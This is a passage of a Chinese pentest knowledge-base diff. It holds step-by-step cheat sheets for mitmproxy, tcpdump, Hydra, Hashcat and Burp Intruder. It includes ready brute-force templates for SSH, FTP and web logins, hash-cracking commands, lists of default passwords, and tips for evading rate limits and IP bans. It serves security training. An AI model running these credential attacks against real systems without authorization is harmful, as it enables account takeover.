自动化爆破与 fuzz（四种攻击模式） |\n| Decoder | 编解码与哈希（Base64/URL/Hex 等） |\n| Comparer | 对比两个响应差异，定位注入点 |\n| Sequencer | 分析 Token 随机性 |\n| Extender | 加载 BApp 扩展 |\n- Decoder：粘贴密文（如 `ZmxhZw==`），`Decode as` 选 Base64 即出明文，也可 Encode 反向操作。\n- Comparer：把两次响应 `Send to Comparer`，高亮差异，快速定位注入成功与失败的区别。\n- Extender：BApp Store 里装 `Logger++`、`Autorize`（越权检测）等扩展，社区版也能用。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 浏览器打不开任何网站 | 代理挂了但没开 Burp，或拦截没放行 | 确认 Burp 在运行、`Intercept is off`，或检查代理端口 |\n| HTTPS 页面显示证书错误 | CA 证书没导入或没信任 | 重新下载 cacert.der 并勾选信任，清浏览器缓存重试 |\n| history 里全是 CONNECT 看不到请求 | 证书没装好，HTTPS 未解密 | 回到第 2 步完整走一遍证书流程 |\n| 修改参数后响应没变化 | 参数名写错或服务端不读该参数 | 对照页面实际提交的参数名（看 history 原文） |\n| Intruder 爆破极慢 | 社区版速率限制 | 换 ffuf/hydra，或减少 payload 数量 |\n| 流量列表刷屏看不清 | 没设 Scope | 按第 4 步配置 Scope 并过滤 in-scope |\n\n#### 实战要点\n- 标准流程五连：配代理 → 装证书 → 抓包 → Repeater 改包 → Intruder 爆破，这套打满就能覆盖绝大多数 Web 测试需求。\n- 越权测试三板斧都在 Repeater：改 `id`、改 `uid`、改 Cookie 里的用户标识，对比响应。\n- 上传/注入类绕过大多要手动改包：改 Content-Type、加后缀、改编码，Repeater 是主战场。\n- 看到可疑请求就 `Send to Repeater`，改一个参数 Send 一次，比在浏览器里折腾快得多。\n- Decoder + Comparer 是 CTF 高频组合：密文直接 Decoder 解，两个响应差异直接 Comparer 看。\n- 长时间挂机任务（批量加 header、自动提取 Token）用 mitmproxy 配 Python 脚本更合适（见 mitmproxy 条目）。\n\n> [!tip] HTTPS 站点需先在浏览器导入 Burp CA 证书，否则流量无法解密。\n\n> [!warn] 社区版 Intruder 功能受限，Payload 过大时改用 ffuf 或脚本。"
+        },
+        {
+          "id": "mitmproxy",
+          "title": "mitmproxy 命令速查",
+          "tags": [
+            "mitmproxy",
+            "proxy",
+            "mitmdump"
+          ],
+          "aliases": [
+            "mitmproxy",
+            "中间人"
+          ],
+          "difficulty": "easy",
+          "summary": "命令行代理工具，适合脚本化与自动化场景，与 Burp 互补。",
+          "content": "\n#### 这个条目的作用\nmitmproxy 是一个开源的中间人代理，用来拦截、查看、修改 HTTP/HTTPS 流量。它有三种形态：`mitmproxy`（交互式 TUI 界面）、`mitmdump`（纯命令行，可加 Python 脚本）、`mitmweb`（浏览器 Web 界面），其中 `mitmdump` 是自动化挂机的首选。\n\n#### 前置条件\n- 已安装 mitmproxy：`pip install mitmproxy` 或 `apt install mitmproxy`\n- 目标浏览器/设备能设置代理（能改代理就能抓）\n- 抓 HTTPS 需要先信任 mitmproxy 的 CA 证书\n\n#### 第 1 步：启动代理\n操作：终端直接运行下面任一命令，先跑通最简单的形态。\n\n```bash\nmitmproxy -p 8080     # 交互式界面（上下键翻页，回车看详情）\nmitmweb -p 8081       # Web 界面，自动打开 http://127.0.0.1:8081\n```\n\n预期结果：`mitmproxy` 会进入全屏列表界面并监听 8080；`mitmweb` 会在浏览器打开流量列表页。没报错就是起来了。\n\n如果不行：提示 `Address already in use` 说明 8080 被占，换端口 `-p 8081`；提示命令找不到说明没装成功，重新 `pip install mitmproxy`。\n\n#### 第 2 步：让浏览器走代理\n操作：以 Firefox 为例，`设置 -> 网络设置 -> 手动配置代理 -> HTTP 代理填 127.0.0.1，端口填 8080`，勾选「也用于 HTTPS」。Chrome 可装 SwitchyOmega 扩展或启动时加参数。\n\n```bash\n# Chrome 命令行方式临时走代理（临时方案，不影响系统设置）\nchrome --proxy-server=\"http://127.0.0.1:8080\"\n```\n\n预期结果：在浏览器随便访问一个 http 网站，mitmproxy 界面里开始刷出请求条目。\n\n如果不行：浏览器一直转圈打不开页面，多半是代理没关又连不上 8080，检查 mitmproxy 是否还在运行，或换成 `127.0.0.1` 拼写错误排查。\n\n#### 第 3 步：信任 HTTPS 证书\n操作：先用代理访问 `http://mitm.it`，页面会列出各系统的证书下载入口，按你的系统（Windows/Android/iOS）下载 cert，然后安装并信任为根证书。\n\n预期结果：安装后再访问 https 网站，mitmproxy 里能看到可读的明文请求，不再显示证书错误页。\n\n如果不行：访问 `http://mitm.it` 打不开，先确认代理确实生效（访问普通 http 站点有流量）；Android 7+ 对用户证书默认不信任，抓 App 流量需把证书装进系统证书区或改用 `mitmproxy` 的 `--set block_global=false` 等配置，平时测 Web 用浏览器证书即可。\n\n#### 第 4 步：交互界面过滤流量\n操作：在 `mitmproxy` 界面底部输入过滤表达式回车，只显示关心的流量。\n\n| 表达式 | 含义 |\n|---|---|\n| `~u login` | URL 中包含 login |\n| `~m POST` | 只看 POST 请求 |\n| `~q` / `~s` | 只看请求 / 只看响应 |\n| `~d google` | 域名包含 google |\n| `~b password` | 请求或响应体包含 password |\n\n预期结果：列表立刻只剩匹配项，按 `q` 退出过滤回到全量列表。\n\n如果不行：输入后没反应，确认不是中文输入法状态；过滤器和 Burp 的 Scope 类似，只影响显示不影响抓包。\n\n#### 第 5 步：mitmdump 保存与回放流量\n操作：`mitmdump` 适合无人值守，用 `-w` 把流量存成文件，用 `-r` 回放分析。\n\n```bash\nmitmdump -p 8080 -w flows.log     # 抓包并写入文件\nmitmdump -r flows.log             # 只读回放，不抓新包\n```\n\n预期结果：`-w` 模式下终端滚动显示流量并落盘；`-r` 回放时把文件内容一行行打出来。\n\n如果不行：文件写不进去先确认当前目录可写；回放显示为空，检查 `-w` 时是否真的抓到过包。\n\n#### 第 6 步：用 Python 脚本自动改包\n操作：写一个 addon 脚本，在请求经过时用 Python 修改，再用 `-s` 加载。\n\n```python\n# addon.py：给每个请求自动加一个 header\ndef request(flow):\n    flow.request.headers[\"X-Custom\"] = \"hello\"\n\ndef response(flow):\n    print(\"URL:\", flow.request.url, \"->\", flow.response.status_code)\n```\n\n```bash\nmitmdump -p 8080 -s addon.py\n```\n\n预期结果：每个请求都带着 `X-Custom: hello` 发出，终端打印每条响应的状态码。\n\n如果不行：报语法错误检查缩进；`ModuleNotFoundError` 说明脚本文件路径写错或文件名带空格。\n\n> [!tip] mitmdump 配 Python 脚本可实现自动改包、自动提取 Token、批量加 header，比 Burp 更适合长时间挂机任务。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| HTTPS 站点显示证书错误 | 未安装并信任 mitmproxy CA 证书 | 代理访问 http://mitm.it 下载证书并安装到系统根证书 |\n| 端口被占用启动失败 | 8080 已被其他程序占用 | `-p` 换端口，或 `lsof -i:8080` 查占用进程 |\n| 浏览器打不开任何网页 | 代理指向了没启动的 mitmproxy | 先启动 mitmproxy 再开浏览器，或临时关闭代理 |\n| 抓不到手机 App 流量 | 设备与电脑不同网段 / 未设代理 | 同一 WiFi 下手动设代理，并完成证书安装 |\n| mitmproxy 界面乱码 | 终端编码问题 | 用 UTF-8 终端，或改用 mitmweb 看 Web 界面 |\n\n#### 实战要点\n- 日常看包用 mitmweb，自动化挂机用 mitmdump，交互翻包用 mitmproxy，形态别混。\n- HTTPS 永远先装证书再谈抓包，证书没装好后面的流量全是密文。\n- 过滤表达式用 `~u`/`~m` 组合能快速定位登录、接口类请求。\n- 改包脚本里操作 `flow.request.headers` / `flow.response` 即可，不用学习复杂 API。\n- 与 Burp 的定位差异：Burp 重放爆破强，mitmproxy 脚本化批处理强，两者互补不冲突。"
+        },
+        {
+          "id": "tcpdump",
+          "title": "tcpdump 抓包速查",
+          "tags": [
+            "tcpdump",
+            "capture",
+            "pcap"
+          ],
+          "aliases": [
+            "抓包",
+            "流量分析"
+          ],
+          "difficulty": "easy",
+          "summary": "服务器端抓包利器，配合 Wireshark 分析 pcap，适合排查反弹 shell 与内网流量。",
+          "content": "\n#### 这个条目的作用\ntcpdump 是 Linux 上最常用的命令行抓包工具，直接看网卡上跑的原始报文。平时渗透常拿它做两件事：一是目标机上看有没有不知名的外连（反弹 shell 排查），二是把流量存成 pcap 拖回本地用 Wireshark 慢慢分析。\n\n#### 前置条件\n- Linux 系统（Kali 自带），root 权限或 sudo（抓包需要）\n- 知道目标网卡名：`ip addr` 或 `ifconfig` 查看，常见 eth0 / ens33 / wlan0\n\n#### 第 1 步：确认网卡并抓全量流量\n操作：先看网卡名，再从该网卡抓包（Ctrl+C 停止）。\n\n```bash\nip addr | grep -E '^[0-9]+:'    # 列出所有网卡名\nsudo tcpdump -i eth0            # 抓 eth0 全部流量\n```\n\n预期结果：终端不断刷新一行行报文摘要（时间戳、源/目的 IP、端口、长度）。刷不出来先确认有流量产生。\n\n如果不行：`No such device` 说明网卡名写错，用 `ip addr` 先查；`Permission denied` 记得加 `sudo`。\n\n#### 第 2 步：按主机、端口、协议过滤\n操作：用 `host` / `port` / `tcp` / `udp` 关键字缩小范围。\n\n```bash\nsudo tcpdump -i eth0 host 1.2.3.4          # 只看与某 IP 的往来\nsudo tcpdump -i eth0 port 80               # 只看 80 端口\nsudo tcpdump -i eth0 tcp                   # 只看 TCP\nsudo tcpdump -i eth0 udp port 53           # 只看 DNS（UDP 53）\n```\n\n预期结果：列表里只剩匹配条件的数据包，其余被过滤掉。\n\n如果不行：写 `port` 时不能和 `tcp` 写反（`tcp port 80` 合法，`port tcp 80` 不合法）；过滤器不生效多是因为没加引号包住组合表达式（见第 3 步）。\n\n#### 第 3 步：组合过滤条件\n操作：用 `and`（或 `&&`）、`or`（或 `||`）、括号组合多个条件，整体用单引号包住。\n\n```bash\nsudo tcpdump -i eth0 'tcp port 80 or udp port 53'\nsudo tcpdump -i eth0 'host 1.2.3.4 and tcp port 4444'\n```\n\n预期结果：只显示同时满足（或任一满足）条件的包。括号写法：`tcpdump -i eth0 'host a and (port 80 or port 443)'`。\n\n如果不行：不加引号时 shell 会把 `&`、括号吃掉报语法错误，所有组合过滤一律用单引号包起来。\n\n#### 第 4 步：抓 SYN 包排查外连与扫描\n操作：抓所有 TCP 的 SYN 标志位包，看谁在建连。\n\n```bash\nsudo tcpdump -i eth0 -n 'tcp[13] & 2 != 0'\n```\n\n预期结果：只显示 SYN 包。`tcp[13]` 是 TCP 头标志位字节，`& 2` 表示取 SYN 位。\n\n如果不行：表达式写错会报 `syntax error`，照抄上面这行即可；`-n` 是关闭域名解析（见第 6 步），建议始终加上。\n\n#### 第 5 步：保存 pcap 并读取\n操作：抓包直接写文件（不刷屏），之后用 `-r` 回放或拖到 Wireshark 分析。\n\n```bash\nsudo tcpdump -i eth0 -w cap.pcap           # 写入文件，Ctrl+C 结束\nsudo tcpdump -r cap.pcap                   # 读回文件查看\nsudo tcpdump -r cap.pcap -c 5              # 只看前 5 个包\n```\n\n预期结果：`-w` 时不打印摘要只静默写盘，结束后 `ls -lh cap.pcap` 能看到文件；`-r` 正常回放。\n\n如果不行：`-w` 写的文件用 `file cap.pcap` 确认是 pcap 格式；用 Wireshark 打开时提示损坏，可能抓包中途被强杀，重新抓即可。\n\n#### 第 6 步：控制输出量\n操作：`-c` 抓够即停、`-n` 不做域名解析、`-A`/`-X` 查看载荷内容。\n\n```bash\nsudo tcpdump -i eth0 -c 100                # 抓 100 个包自动停止\nsudo tcpdump -i eth0 -n                    # 显示 IP 而不是解析域名\nsudo tcpdump -i eth0 -A                    # 以 ASCII 显示载荷（看明文 HTTP）\nsudo tcpdump -i eth0 -X                    # hex + ASCII 双显示\n```\n\n预期结果：`-c 100` 抓满自动退出；`-A` 下能直接读出 HTTP 请求头等明文内容。\n\n如果不行：`-c` 还没到数量就 Ctrl+C 是正常的；想看完整 HTTP 明文建议 `-A` 加过滤 `port 80` 一起用，否则刷屏太快。\n\n> [!tip] 排查反弹 shell 时全量抓包后找陌生外连 IP，或抓 SYN 包 `tcpdump -i eth0 -n 'tcp[13] & 2 != 0'`。\n\n> [!warn] 抓包需 root 权限；生产环境注意 -w 磁盘占用，用 -c 或 timeout 限制时长。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| No such device | 网卡名写错 | 先 `ip addr` 查真实网卡名（eth0/ens33 等） |\n| Permission denied | 没权限 | 命令前加 `sudo` |\n| syntax error | 过滤表达式被 shell 拆解 | 组合条件整体用单引号包住 |\n| 抓包文件巨大撑爆磁盘 | 长时间 `-w` 不做限制 | 加 `-c 数量` 或用 `timeout 300 tcpdump -i eth0 -w x.pcap` |\n| 看不到 HTTPS 内容 | 流量加密 | 抓包目标改为看 TLS 握手/连接行为，明文内容交给 mitmproxy 解密 |\n| 网卡混杂模式提示 | 某些环境下抓不全 | 确认网卡支持并提示已进入 promiscuous 即可 |\n\n#### 实战要点\n- 先想清楚「我要看哪个网卡、哪个端口」，过滤器能省 90% 的刷屏时间。\n- 渗透排查反弹 shell：`tcpdump -i any -n 'tcp[13] & 2 != 0'` 盯陌生 IP 的建连。\n- 目标机不方便装 Wireshark 时，`-w` 存 pcap 拖回本地分析是标准姿势。\n- `-n` 建议常开，域名解析既慢又可能泄露查询痕迹。\n- 看明文协议（HTTP/FTP/Telnet）用 `-A`；看二进制结构用 `-X`。"
+        }
+      ]
+    },
+    {
+      "id": "g-brute",
+      "name": "爆破与口令",
+      "intro": "在线爆破、哈希破解、组合策略",
+      "entries": [
+        {
+          "id": "hydra",
+          "title": "Hydra 在线爆破模板",
+          "tags": [
+            "hydra",
+            "brute",
+            "ssh",
+            "ftp",
+            "http"
+          ],
+          "aliases": [
+            "hydra",
+            "爆破"
+          ],
+          "difficulty": "easy",
+          "summary": "Hydra 支持数十种协议在线爆破，模板化使用即可覆盖 SSH、FTP、Web 登录等场景。",
+          "content": "\n#### 这个条目的作用\nHydra 是经典的在线口令爆破工具：不断用猜的用户名/密码去登录目标服务，直到蒙对。它内置几十种协议支持（SSH、FTP、HTTP、RDP、MySQL 等），是拿到端口后批量试弱口令的主力工具。\n\n#### 前置条件\n- Kali 自带 hydra；其他系统 `apt install hydra` 或 `brew install hydra`\n- 已通过扫描拿到目标 IP、服务端口、服务类型\n- 准备好用户名和密码字典（SecLists 里有现成的）\n\n#### 第 1 步：准备字典文件\n操作：每个用户名/密码一行，纯文本保存。\n\n```bash\n# users.txt（举例）\nadmin\nroot\nuser\n\n# pass.txt（举例）\nadmin\n123456\npassword\n```\n\n预期结果：`cat users.txt` 能逐行打印内容，文件无 BOM、无空行干扰。\n\n如果不行：Windows 编辑的 txt 换成 `sed -i 's/\\r$//' users.txt` 去行尾符，否则会带看不见的 `\\r` 导致爆破全失败。\n\n#### 第 2 步：SSH 爆破\n操作：用 `-L 用户字典 -P 密码字典`，服务地址写成 `协议://IP` 形式。\n\n```bash\nhydra -L users.txt -P pass.txt ssh://192.168.1.10\n```\n\n预期结果：逐个尝试并在最后打印 `[ssh] host: 192.168.1.10 login: admin password: 123456` 这类命中行，没命中也会给统计汇总。\n\n如果不行：提示 `Connection refused` 先确认 22 端口真的开放（`nmap -p 22`）；提示版本未知（`unknown service`）说明该服务在目标上协议实现特殊，换 `-s 端口` 指定或放弃该协议。\n\n#### 第 3 步：FTP 爆破（单用户名）\n操作：已知用户名时用 `-l`（小写 L）固定用户名，只爆密码。\n\n```bash\nhydra -l admin -P pass.txt ftp://192.168.1.10\n```\n\n预期结果：只对 admin 这个用户名尝试所有密码，命中输出 `[ftp] host: 192.168.1.10 login: admin password: admin888`。\n\n如果不行：FTP 服务对连续失败有封禁策略，命中不了先看 `-t` 线程数（见第 6 步）并降速重试。\n\n#### 第 4 步：HTTP POST 表单爆破（重点）\n操作：Web 登录爆破需要把「表单怎么提交、失败时页面长什么样」告诉 hydra，用 `http-post-form` 协议。\n\n```bash\nhydra -l admin -P pass.txt 192.168.1.10 http-post-form \\\n  \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"\n```\n\n语法拆解：三个冒号分隔的段 —— `路径` : `POST 体（^USER^/^PASS^ 是占位符，会被字典内容替换）` : `失败标志`。也可以反过来用 `S=success` 指定成功标志。\n\n预期结果：尝试所有密码，正确的那个请求会得到不含 `incorrect` 的响应，hydra 判定命中。\n\n如果不行：最常见是失败标志找错——先从 Burp 抓一次错误登录的响应，找响应体里稳定的词（如 `incorrect`、`error`、`用户名或密码错误`）填到 F= 后面；表单参数名（本例 user/pass）要以 Burp 抓包为准，写错参数名永远爆不出来。\n\n#### 第 5 步：保存结果与命中即停\n操作：加 `-o` 保存结果，加 `-f` 命中第一个即停。\n\n```bash\nhydra -L users.txt -P pass.txt -t 16 -f -o ok.txt ssh://192.168.1.10\n```\n\n预期结果：进程在命中后停止，`cat ok.txt` 能看到所有命中的账号密码记录。\n\n如果不行：`ok.txt` 没生成是正常（没命中），命中后才有内容；`-f` 只对单目标有效。\n\n#### 第 6 步：常用参数调节\n操作：按目标承受能力调并发、显示与超时。\n\n```bash\nhydra -L users.txt -P pass.txt -t 8 -V -o ok.txt ssh://192.168.1.10    # -V 显示每次尝试\nhydra -l admin -P pass.txt -s 2222 ftp://192.168.1.10                  # -s 指定非默认端口\nhydra -l admin -P pass.txt -w 10 ftp://192.168.1.10                    # -w 单次超时 10 秒\n```\n\n| 参数 | 作用 |\n|---|---|\n| -l / -L | 固定用户名 / 用户名字典 |\n| -p / -P | 固定密码 / 密码字典 |\n| -t | 并发线程数（默认 16） |\n| -f | 命中第一个即停止 |\n| -o 文件 | 保存结果 |\n| -V | 显示每次尝试 |\n| -s 端口 | 指定非默认端口 |\n| -w 秒 | 连接超时时间 |\n\n预期结果：参数生效后行为符合上述表格描述，例如 `-s 2222` 会去连 2222 端口。\n\n> [!warn] 爆破属高风险操作，务必确认授权；-t 过高会打爆目标或被封 IP，配合代理或限速。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 爆不出任何结果 | 字典太弱 / 目标有防爆破 | 换大字典（rockyou），降线程 -t 4，配合代理 |\n| Connection refused | 端口没开或写错 | 用 nmap 确认端口与协议再爆 |\n| http-post-form 语法错误 | 三段冒号拆分不对或失败标志错 | 抓包确认参数名与失败标志词，照 `路径:POST体:F=标志` 模板重写 |\n| 密码带 \\r 全部失败 | Windows 编辑的字典 | `sed -i 's/\\r$//' 字典文件` 去行尾符 |\n| IP 被封 | 并发太高触发封禁 | 换 IP 入口或降 -t，加睡眠重试 |\n| Hydra 不存在命令 | 未安装 | `apt install hydra`（Kali 默认自带） |\n\n#### 实战要点\n- 顺序：nmap 探到服务 -> 定位登录入口 -> Burp 抓包拿参数名 -> 填 hydra 模板。\n- FTP/SSH 类直接写 `协议://IP`；Web 登录一律用 `http-post-form` 并确认失败标志。\n- 爆破前先试默认口令（admin/admin、root/123456），常比跑字典快。\n- 大字典用小线程慢跑，别把目标打挂；授权边界内操作。\n- 命中口令后立即验证是否可登录成功，hydra 偶有误报（尤其 F= 标志选词不稳时）。"
+        },
+        {
+          "id": "hashcat",
+          "title": "Hashcat 模式与字典路径",
+          "tags": [
+            "hashcat",
+            "hash",
+            "crack"
+          ],
+          "aliases": [
+            "hashcat",
+            "密码破解"
+          ],
+          "difficulty": "medium",
+          "summary": "Hashcat 用 GPU 高速破解哈希，选对 hash 模式是关键，字典与掩码配合使用。",
+          "content": "\n#### 这个条目的作用\nhashcat 是离线哈希破解工具：把拿到的哈希（MD5、SHA、NTLM、bcrypt 等）放到本机用 GPU/CPU 暴力尝试，尝试出原文密码。它不联网打目标，破解的是你已经拿到手的哈希文件，速度和「模式选得对不对」直接相关。\n\n#### 前置条件\n- 一台有 NVIDIA/AMD 显卡或较强 CPU 的机器（Kali 自带 hashcat）\n- 一个格式正确的哈希文件（每行一个哈希，`hash:用户名` 这类组合要对应模式）\n- 密码字典（`/usr/share/wordlists/rockyou.txt`）或掩码思路\n\n#### 第 1 步：确认哈希类型\n操作：先让 hashcat 猜哈希类型，避免模式选错白跑。\n\n```bash\nhashcat --identify hash.txt\n```\n\n预期结果：输出 `Hash-mode 0 [ MD5 ]` 之类的结果，给出候选模式与算法名。\n\n如果不行：`--identify` 猜错或不确定，人工根据哈希长度判断：32 位十六进制多为 MD5（模式 0）、40 位多为 SHA1（100）、开头 `$6$` 是 sha512crypt（1800）、`$2y$`/`$2b$` 开头是 bcrypt（3200）。\n\n#### 第 2 步：准备字典\n操作：Kali 的 rockyou 是压缩包，先解压，再确认可用。\n\n```bash\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\nwc -l /usr/share/wordlists/rockyou.txt\n```\n\n预期结果：解压后文件存在，行数在 1400 万行左右（`wc -l` 输出 `14344391` 等大数）。\n\n如果不行：确认 `/usr/share/wordlists/` 下真的有 rockyou.txt.gz，没有就先 `apt install wordlists` 或从 SecLists 拿密码字典（`/usr/share/seclists/Passwords/` 下有分类目录）。\n\n#### 第 3 步：字典攻击（-a 0）\n操作：`-m` 指定哈希模式，`-a 0` 指定字典攻击，后面依次是哈希文件、字典。\n\n```bash\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n```\n\n预期结果：界面显示进度（`Recovered : 3/10` 之类）并滚动尝试速率；跑完提示用 `--show` 看结果。\n\n如果不行：`No hashes loaded` 说明哈希文件格式不对，确认每行一个哈希且无多余空格；提示 `Separator unmatched` 说明文件里冒号组合的格式不符合该模式要求。\n\n#### 第 4 步：查看破解结果\n操作：`--show` 输出已破解的哈希与明文，`--potfile-path` 看存储文件。\n\n```bash\nhashcat -m 0 hash.txt --show\n```\n\n预期结果：输出 `5f4dcc3b5aa765d61d8327deb882cf99:password` 这类「哈希:明文」行。\n\n如果不行：`--show` 为空先确认这次会话真的破解成功过（看运行时的 `Recovered` 计数）；破解结果是持久化的，重启后 `--show` 依然能查。\n\n#### 第 5 步：掩码攻击（-a 3）跑短密码\n操作：不知道常见密码、想按规则穷举时用掩码。`?l 小写 ?u 大写 ?d 数字 ?s 特殊符号 ?a 全字符`。\n\n```bash\nhashcat -m 0 -a 3 hash.txt '?d?d?d?d?d?d'        # 6 位纯数字，如 123456\nhashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?l?d?d'    # 常见组合：大写+小写+数字\n```\n\n预期结果：按掩码规则生成所有组合（?d 表示 0-9，6 位就是 100 万种）逐一尝试。掩码越长组合数爆炸，先跑短的。\n\n如果不行：掩码里不能混入字面量（如 `?d?d?d` 写全），否则组合数不对；复杂规则（固定前缀如 `admin?d?d?d`）直接写进掩码即可。\n\n#### 第 6 步：组合攻击（-a 1）拼两个字典\n操作：`-a 1` 把两个字典逐项拼接（第一个在前）。\n\n```bash\nhashcat -m 1000 -a 1 hash.txt d1.txt d2.txt      # 每项 = d1 内容 + d2 内容\n```\n\n预期结果：组合数 = 字典1 行数 × 字典2 行数。\n\n如果不行：`-a 1` 必须且只能给两个字典文件，多了少了都会报参数错误。\n\n#### 第 7 步：规则变形（-r）扩展字典\n操作：加载规则文件让每个字典词变形（加后缀、大小写、Leet 替换）。\n\n```bash\nhashcat -m 0 -a 0 hash.txt dict.txt -r /usr/share/hashcat/rules/best64.rule\n```\n\n预期结果：`best64.rule` 会基于每个原词生成 64 种常见变形（如 password -> password1、Password!）。\n\n如果不行：规则文件路径写错会 `File not found`；规则数量大时速度下降明显，属正常现象。\n\n> [!tip] 常见弱口令组合：admin/admin、root/root、admin/123456、admin/admin888、password、厂商默认口令如 admin/Admin@123。\n\n> [!warn] hashcat 需 GPU 或高性能 CPU；先 `hashcat --identify` 确认哈希类型，参数错会直接报错退出。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| No hashes loaded | 哈希文件为空或格式不符模式 | 每行一个哈希，去掉多余字符，用 --identify 核对 |\n| Separator unmatched | `哈希:用户名` 格式与模式不匹配 | 换对应模式，或去掉冒号后部分只留哈希 |\n| OpenCL 报错/无设备 | 显卡驱动或 OpenCL 未装 | 装显卡驱动，或用 `--force`（CPU 也能跑，慢） |\n| --show 为空 | 没破解成功或模式不对 | 换字典/掩码，先确认 --identify 结果 |\n| Exhausted 无结果 | 字典/掩码空间已跑完 | 换大字典、加规则 -r、换掩码思路 |\n| 破解速度极慢 | GPU 没启用、算法是 bcrypt/argon2 | 核对 -m 模式，慢算法属正常，缩小字典 |\n\n#### 实战要点\n- 先 `--identify` 或人工看哈希特征定模式，模式错了什么都白跑。\n- 密码库里的 admin/123456 这类先试 `rockyou` 字典，秒出；跑不完再上掩码。\n- 掩码从短到长：`?d?d?d?d?d?d`（100 万）→ 7 位 → 8 位，别一上来跑 10 位。\n- 慢哈希（1800/3200）别跑大字典，先试常见弱口令字典（sec lists 的 Common-Credentials）。\n- 破解结果记在 potfile 里，换命令前先 `--show` 把已破的明文捞出来保存。"
+        },
+        {
+          "id": "burp-intruder",
+          "title": "Intruder 四种攻击模式",
+          "tags": [
+            "burp",
+            "intruder",
+            "fuzz"
+          ],
+          "aliases": [
+            "intruder",
+            "爆破模式"
+          ],
+          "difficulty": "easy",
+          "summary": "Intruder 的四种模式解决不同爆破场景，选错模式会直接导致结果无效。",
+          "content": "\n#### 这个条目的作用\nBurp Intruder 是自动化「重复发请求、换参数」的工具，做登录爆破、参数 fuzz、ID 遍历都靠它。它的核心是四种攻击模式——决定「payload 往哪些位置填、怎么组合」，选错模式轻则慢、重则结果全废。\n\n#### 前置条件\n- Burp Suite 已启动，浏览器代理已配置、CA 证书已装\n- 已在 Proxy 里抓到目标登录请求（或任何要爆破的请求）\n- 准备好 payload 字典（用户名/密码/ID 列表等）\n\n#### 第 1 步：把请求发到 Intruder\n操作：在 Proxy 的 HTTP history 里找到目标请求，右键。\n\n```txt\n右键请求 -> Send to Intruder（快捷键 Ctrl+I 或 Cmd+I）\n```\n\n预期结果：底部切到 `Intruder` 标签页能看到 `Positions` 面板，请求原文带彩色高亮的参数。\n\n如果不行：请求列表里没有目标请求，先确认代理抓包成功、请求确实经过 Burp；右键菜单找不到 Send to Intruder 说明没选中请求行。\n\n#### 第 2 步：标记攻击位置\n操作：在 `Positions` 页，把要替换的参数用鼠标选中后点 `Add §` 加上两个 § 符号。\n\n```txt\nPOST /login.php HTTP/1.1\n...\nuser=§admin§&pass=§123456§\n```\n\n预期结果：要爆破的参数被 `§` 包围，`Attack type` 下拉框可用，`Payload positions` 列出所有标记。\n\n如果不行：误标的参数点 `Clear §` 清空重标；`§` 计数必须是偶数成对，否则 Burp 会提示位置无效。\n\n#### 第 3 步：选择攻击模式\n操作：在 `Attack type` 下拉框里选。这是 Intruder 的灵魂，按场景选：\n\n| 模式 | 行为 | 适用场景 |\n|---|---|---|\n| Sniper 狙击手 | 一个位置一个位置地换 payload，同一时刻只动一个 § | 单参数爆破（只爆密码） |\n| Battering ram 攻城锤 | 所有 § 位置同时填入同一个 payload 值 | 用户名密码相同的场景（admin/admin） |\n| Pitchfork 草叉 | 多组 payload（Payload set 1/2...）按行一一配对，第 N 行组合 | 已有 用户名-密码 配对字典 |\n| Cluster bomb 集束炸弹 | 多组 payload 做笛卡尔积全组合 | 用户名 X 密码全组合摸底 |\n\n预期结果：选 Sniper 时下方只有 `Payload set 1`；选 Pitchfork/Cluster bomb 时出现 Payload set 1/2 两个标签页。\n\n如果不行：选了 Pitchfork 却只有一个 payload 集，说明 § 位置不足两个；两个 § 位置必须各自对应一个 payload 集。\n\n#### 第 4 步：配置 payload 字典\n操作：分别进 `Payloads` 页，`Payload set` 选 1（或 2），`Payload type` 选 `Simple list`，把字典粘贴进下方列表，或用 `Load` 从文件导入。\n\n```txt\nPayload set: 1\nPayload type: Simple list\n[admin, root, user, ...]      # 用户名字典\nLoad... -> top-usernames.txt\n\nPayload set: 2\n[123456, password, admin888, ...]   # 密码字典\nLoad... -> top-passwords.txt\n```\n\n预期结果：每个 payload 集下方显示加载的条目数量；右上角 `Start attack` 按钮变为可用。\n\n如果不行：`Load` 按钮在 payload 列表上方；文件里是空行会自动跳过；条数显示 0 说明文件读取失败，检查编码与路径。\n\n#### 第 5 步：调 Options（线程与匹配）\n操作：进 `Settings`（旧版叫 Options）页：`Resource pool` 调并发（默认 1 线程，爆破调到 10-20），`Grep - Match` 加「用户名或密码错误」这类失败特征词便于区分成功响应。\n\n预期结果：`Resource pool` 有并发设置；`Grep - Match` 列表里加了特征词后，攻击结果表会多一列对勾显示该词是否出现。\n\n如果不行：社区版（Community）限速严重，调高并发也没用，改用词语法或换 ffuf；特征词必须和响应体实际内容一致，从 Burp 里复制。\n\n#### 第 6 步：发起攻击并分析结果\n操作：点 `Start attack`，结果表按 `Length`（响应长度）或 `Status` 排序找异常项。\n\n预期结果：弹窗里逐行闪过请求；爆完点列头排序，登录成功的响应通常长度和状态码与失败的明显不同（更长的跳转页 / 200 而非 302）。\n\n如果不行：全部长度一样说明 payload 没生效（§ 位置标错）或特征没变；点开单条记录看 Response 内容手动确认是否真的成功。\n\n> [!tip] 登录爆破优先 Pitchfork 用 seclists 的 top-usernames 加 top-passwords 配对字典，比全组合快得多。\n\n> [!warn] 社区版 Intruder 有速率限制，高并发先确认目标能承受，配合 Throttle 限速。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 攻击结果全部相同 | § 位置没标对 / payload 没替换进请求 | 回 Positions 核对 §，重发一条看 payload 是否真正替换 |\n| 有 Payload set 2 但没生效 | 选了 Sniper 只用第一个集 | 改成 Pitchfork 或 Cluster bomb |\n| 登录页跳验证码/封 IP | 触发防爆破 | 降线程加 Throttle，或换思路绕验证码 |\n| 社区版速度极慢 | 版本限速 | 小字典精爆，大字典换 ffuf/脚本 |\n| Pitchfork 配对错位 | 两个字典行数不等 | 让两组字典行数对齐（补齐或截断） 